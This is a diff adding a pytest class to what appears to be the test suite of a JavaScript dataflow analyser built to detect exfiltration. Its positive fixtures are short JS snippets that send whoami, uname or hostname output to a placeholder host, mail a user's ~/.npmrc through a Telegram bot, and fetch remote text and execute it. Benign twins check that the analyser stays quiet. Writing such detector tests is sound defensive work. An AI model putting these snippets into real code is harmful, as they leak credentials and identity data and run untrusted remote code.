@@ -538,6 +538,87 @@ class TestRequests:
         assert self.kinds(text) == ["registry"]
 
 
+class TestCensusSpellings:
+    """Study-half misses the P3 census found carrying a payload a rule could see, in spellings
+    the dataflow did not follow (review 98 P4). Each positive is followed; each benign twin stays
+    quiet."""
+
+    REACHED: ClassVar[dict[str, tuple[str, tuple[list[str], str]]]] = {
+        "identity command through a helper": (
+            'const cp = require("child_process");\n'
+            'function send(p) { fetch("https://h.invalid/w?" + p).catch(() => {}); }\n'
+            'const who = cp.execSync("who" + "ami", {encoding: "utf8"}).trim();\n'
+            'send("u=" + encodeURIComponent(who));\n',
+            (["identity"], "request"),
+        ),
+        "identity command's callback": (
+            'const { exec } = require("child_process");\n'
+            'exec("uname -a", (e, out) => { require("https").get("https://h.invalid/?u=" + out); });\n',
+            (["identity"], "request"),
+        ),
+        "a computed os member": (
+            'const os = require("os");\nfetch("https://h.invalid/?h=" + os["host" + "name"]());\n',
+            (["identity"], "request"),
+        ),
+        "a Telegram bot sending a file": (
+            'const { Telegraf } = require("telegraf"); const fs = require("fs");\n'
+            "const bot = new Telegraf(TOKEN);\n"
+            'bot.telegram.sendDocument(CHAT, { source: fs.readFileSync(process.env.HOME + "/.npmrc") });\n',
+            (["home_file", "secret_file"], "request"),
+        ),
+        "a Discord webhook client": (
+            'const { WebhookClient } = require("discord.js"); const os = require("os");\n'
+            "const hook = new WebhookClient({ url: U });\nhook.send(os.hostname());\n",
+            (["identity"], "request"),
+        ),
+        "a static method's sink": (
+            'const cp = require("child_process");\n'
+            "class W { static start(p) { cp.execFile(p, []); } }\n"
+            'async function go() { W.start(await (await fetch("https://h.invalid/x")).text()); }\n',
+            (["network_response"], "process"),
+        ),
+    }
+    QUIET: ClassVar[dict[str, str]] = {
+        "an identity command printed": (
+            'const cp = require("child_process");\nconsole.log(cp.execSync("whoami").toString());\n'
+        ),
+        "another command's output sent": (
+            'const cp = require("child_process");\nconst d = cp.execSync("git diff").toString();\n'
+            'fetch("https://api.invalid/review", { method: "POST", body: d });\n'
+        ),
+        "a bot replying": (
+            'const { Telegraf } = require("telegraf");\nconst bot = new Telegraf(process.env.BOT_TOKEN);\n'
+            'bot.on("text", c => bot.telegram.sendMessage(c.chat.id, "hi " + c.from.first_name));\n'
+        ),
+        "a secret written, then its path logged": (
+            'const fs = require("fs"); const k = fs.readFileSync(process.env.HOME + "/.npmrc");\n'
+            'const p = "/tmp/k"; fs.writeFileSync(p, k); fetch("https://h.invalid/log?p=" + p);\n'
+        ),
+        "a config downloaded, another program run": (
+            'const fs = require("fs"); const cp = require("child_process");\n'
+            'async function go() { const c = await (await fetch("https://h.invalid/c")).text();\n'
+            '  const p = "cfg.json"; fs.writeFileSync(p, c); cp.execFileSync("ls", ["-l"]); }\n'
+        ),
+    }
+
+    @pytest.mark.parametrize("name", sorted(REACHED))
+    def test_reached(self, name: str) -> None:
+        text, want = self.REACHED[name]
+        assert want in [f[:2] for f in FlowKit.flows(text)]
+
+    @pytest.mark.parametrize("name", sorted(QUIET))
+    def test_quiet(self, name: str) -> None:
+        reported = {
+            ("identity", "request"),
+            ("secret_file", "request"),
+            ("home_file", "request"),
+            ("network_response", "process"),
+            ("network_response", "execute"),
+        }
+        flows = FlowKit.flows(self.QUIET[name])
+        assert not [f for f in flows for s in f[0] if (s, f[1]) in reported]
+
+
 class TestBounds:
     def test_a_large_generated_file_finishes(self) -> None:
         text = "".join(f"function f{i}(a) {{ return g{i}(a) + {i}; }}\n" for i in range(20_000))
